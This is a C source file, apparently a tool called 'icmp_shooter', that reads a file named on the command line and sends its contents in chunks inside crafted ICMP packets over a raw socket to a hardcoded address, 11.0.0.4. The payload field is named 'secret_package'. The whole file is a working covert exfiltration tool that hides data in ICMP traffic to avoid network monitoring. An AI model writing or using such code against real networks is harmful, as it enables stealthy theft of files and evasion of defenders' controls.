#include<stdlib.h>
#include<errno.h>
#include <sys/cdefs.h>
#include <sys/types.h>
#include<netinet/ip.h>
#include <sys/socket.h>
#include<netinet/in.h>
#include<netinet/ip_icmp.h>
#include <arpa/inet.h>
#include<string.h>
#include<stdio.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>

#define MAX_PEANTBTR_LEN 512

struct ouricmphdr
{
  u_int8_t type;		/* message type */
  u_int8_t code;		/* type sub-code */
  u_int16_t checksum;
  union
  {
    struct
    {
      u_int16_t	id;
      u_int16_t	sequence;
    } echo;			/* echo datagram */
    u_int32_t	gateway;	/* gateway address */
    struct
    {
      u_int16_t	__unused;
      u_int16_t	mtu;
    } frag;			/* path mtu discovery */
  } un;
  u_int16_t peanut;
};


#define MAX_MSG_SIZE (MAX_PEANTBTR_LEN - sizeof(struct ouricmphdr))


struct peanutbutter {
    struct ouricmphdr mycmp;
    char secret_package[MAX_MSG_SIZE];
};

/*int prep_pkt(struct peanutbutter * pb, void *buf, ssize_t count);*/
uint16_t ip_checksum(void* vdata,size_t length);

int main(int argc, char ** argv){

    struct sockaddr_in ip4addr;
    char * destip = "11.0.0.4";
    char * srcip = "11.0.0.2";
    ip4addr.sin_family = AF_INET;
    int res = inet_aton(destip,&(ip4addr.sin_addr));
    int socky = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(socky == -1)
        printf("socky error is: %s\n", strerror(errno));

    struct peanutbutter pb;
    /*pb = (struct peanutbutter*)malloc(sizeof(struct peanutbutter));*/
    pb.mycmp.type = ICMP_INFO_REPLY;
    pb.mycmp.code = 0;  //  ¯\_(ツ)_/¯
    pb.mycmp.checksum=0;
    pb.mycmp.peanut=2;
    pb.mycmp.un.echo.id = 0xbeef;
    pb.mycmp.un.echo.sequence = 512;
    pb.mycmp.un.gateway = 0xfeedface;
    pb.mycmp.un.frag.mtu = 0x0011;
    
    // argv == icmp_shooter fiel_name
    char * filename = argv[1];
    
    // open file 
    int fd = open(filename, O_RDONLY);

    // loop contents until less PACKETSIZE and shoot
    ssize_t bytes_read;
    char buf[MAX_MSG_SIZE];
    while((bytes_read = read(fd, buf, MAX_MSG_SIZE)) != 0){
        /*res = prep_pkt(pb, buf, bytes_read);*/

        strncpy(pb.secret_package, buf, bytes_read);
        pb.mycmp.checksum=ip_checksum(&pb, sizeof(struct peanutbutter));
        /*memset(buf + 320, 0, MAX_MSG_SIZE - bytes_read);*/
        printf("%s", buf);
        int ret = sendto(socky, &pb, sizeof(pb), 0, (struct sockaddr *) &ip4addr, sizeof(struct sockaddr));
        if(ret == -1)
            printf("sendto error is: %s\n", strerror(errno));
        printf("BAMMMMMM\n");
        /*free(pb);*/
        /*pb = NULL;*/
        memset(pb.secret_package, 0, MAX_MSG_SIZE);
    } 
    
    return 0;
}

/*int prep_pkt(struct peanutbutter * pb, void *buf, ssize_t count){*/
    /*pb = (struct peanutbutter*)malloc(sizeof(struct peanutbutter));*/
    /*pb->mycmp.type = ICMP_INFO_REPLY;*/
    /*pb->mycmp.code = 0;  //  ¯\_(ツ)_/¯*/
    /*pb->mycmp.checksum=0;*/
    /*pb->mycmp.peanut=2;*/
    /*pb->mycmp.un.echo.id = 0xbeef;*/
    /*pb->mycmp.un.echo.sequence = 512;*/
    /*pb->mycmp.un.gateway = 0xfeedface;*/
    /*pb->mycmp.un.frag.mtu = 0x0011;*/
    /*strncpy(pb->secret_package, buf, count);*/
    /*pb->mycmp.checksum=ip_checksum(pb, sizeof(struct peanutbutter));*/
    /*return 0;*/
/*}*/

uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint32_t acc=0xffff;

    // Handle complete 16-bit blocks.
    for (size_t i=0;i+1<length;i+=2) {
        uint16_t word;
        memcpy(&word,data+i,2);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Handle any partial block at the end of the data.
    if (length&1) {
        uint16_t word=0;
        memcpy(&word,data+length-1,1);
        acc+=ntohs(word);
        if (acc>0xffff) {
            acc-=0xffff;
        }
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}

